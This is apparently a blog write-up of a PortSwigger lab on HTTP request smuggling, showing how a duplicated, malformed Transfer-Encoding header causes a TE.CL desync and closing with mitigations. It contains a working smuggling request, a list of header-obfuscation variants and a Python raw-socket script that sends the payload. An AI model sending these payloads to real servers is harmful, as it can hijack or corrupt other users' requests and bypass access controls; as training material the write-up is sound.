---
layout: post
title: "PortSwigger: HTTP Request Smuggling, Obfuscating the TE Header"
date: 2027-09-08 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, http-request-smuggling, te-header, desync, transfer-encoding, obfuscation, gpost, cwe-444]
---

In the basic CL.TE and TE.CL labs the front-end and back-end disagree because one prefers `Content-Length` and the other prefers `Transfer-Encoding`. But what if **both** servers happily speak `Transfer-Encoding: chunked`? A single clean header makes them agree — and nothing smuggles. This lab is about manufacturing a disagreement by *obfuscating* the Transfer-Encoding header so only one of the two servers still recognizes it.

## Overview

We send the `Transfer-Encoding` header **twice** — one valid, one deliberately malformed. The two servers resolve the duplicate differently: one honors `chunked`, the other rejects the obfuscated pair and falls back to `Content-Length`. That re-creates the same CL-vs-TE split as a plain TE.CL desync, and we use it to smuggle a `GPOST` request.

- **Vuln class:** HTTP request smuggling (TE-header obfuscation)
- **CWE:** [CWE-444 — Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)

## Background: when both servers support chunked

Request smuggling needs the front-end and back-end to disagree about where a request ends. The two length mechanisms are:

- **`Content-Length`** — a byte count of the body.
- **`Transfer-Encoding: chunked`** — the body declares its own length, chunk by chunk, ending with a `0` chunk.

In the basic labs the disagreement is built in: one server uses CL, the other uses TE. Here, both servers are perfectly comfortable with chunked encoding. Send a clean `Transfer-Encoding: chunked` and they *agree* — the body is parsed identically on both sides, and there's no desync to exploit.

## The trick: obfuscate the TE header

The fix is to send the header in a form that one server accepts and the other rejects. The simplest reliable way is a **duplicate header**, one valid and one bogus:

```
Transfer-Encoding: chunked
Transfer-encoding: cow
```

One server picks the valid `chunked` and processes the body as chunked. The other sees a duplicate Transfer-Encoding header with a garbage value (`cow`), decides the whole TE declaration is untrustworthy, ignores it, and falls back to `Content-Length`. That single point of disagreement is the entire exploit.

Other obfuscations that work against different server stacks:

- a space or tab between the colon and the value
- a leading space before the header name
- `X: X\r\nTransfer-Encoding: chunked` (folded onto a previous header)
- `Transfer-Encoding\r\n: chunked`
- `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
- a vertical-tab (`\x0b`) prefixed value (the classic HAProxy 1.9.10 bypass)

## The exploit request

```
POST / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1

0

```

How the two servers read it:

- **The chunked server** reads chunk size `5c` (hex) = 92 bytes — exactly the length of the `GPOST / HTTP/1.1 ... x=1` block — consumes it as one chunk, then sees the `0` chunk and considers the request complete.
- **The Content-Length server** reads only `Content-length: 4` = the four bytes `5c\r\n` as the body, and leaves `GPOST / HTTP/1.1...` sitting unread on the connection.

That leftover text becomes the prefix of the **next** request on the shared connection, so its method line turns into `GPOST`. Send the request **twice**: the first send plants the prefix, the second send is prefixed by it.

**Result:** the second response comes back `HTTP/1.1 403 Forbidden` with `"Unrecognized method GPOST"`, and the lab is marked **Solved**.

## Driving it from the command line

`curl` is no help here — it normalizes duplicate and conflicting framing headers, so it would never put two `Transfer-Encoding` headers on the wire. The request has to go out byte-for-byte over a raw TLS socket, and we must force HTTP/1.1 at the TLS layer (`set_alpn_protocols(['http/1.1'])`) — otherwise the handshake negotiates HTTP/2, which frames body length itself and has no CL/TE ambiguity to abuse (a silent false negative).

```python
import socket, ssl
h = "<lab-id>.web-security-academy.net"
sm = ("GPOST / HTTP/1.1\r\n"
      "Content-Type: application/x-www-form-urlencoded\r\n"
      "Content-Length: 15\r\n\r\nx=1")
req = ("POST / HTTP/1.1\r\n"
       f"Host: {h}\r\n"
       "Content-Type: application/x-www-form-urlencoded\r\n"
       "Content-length: 4\r\n"
       "Transfer-Encoding: chunked\r\n"
       "Transfer-encoding: cow\r\n\r\n"
       f"{len(sm):x}\r\n{sm}\r\n0\r\n\r\n").encode()
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(["http/1.1"])
for i in (1, 2):
    s = ctx.wrap_socket(socket.create_connection((h, 443)), server_hostname=h)
    s.sendall(req)
    print(i, s.recv(4096).split(b"\r\n")[0].decode())
    s.close()
```

The second iteration prints the `403` carrying `"Unrecognized method GPOST"`.

## The fix

- Reject any request that carries **more than one** `Transfer-Encoding` header, or a TE value that isn't a recognized encoding.
- Never silently fall back to `Content-Length` when a `Transfer-Encoding` header is present but unparseable — drop the request instead of guessing.
- Best of all, speak **HTTP/2 end-to-end**: its length framing removes the Content-Length vs Transfer-Encoding ambiguity entirely.
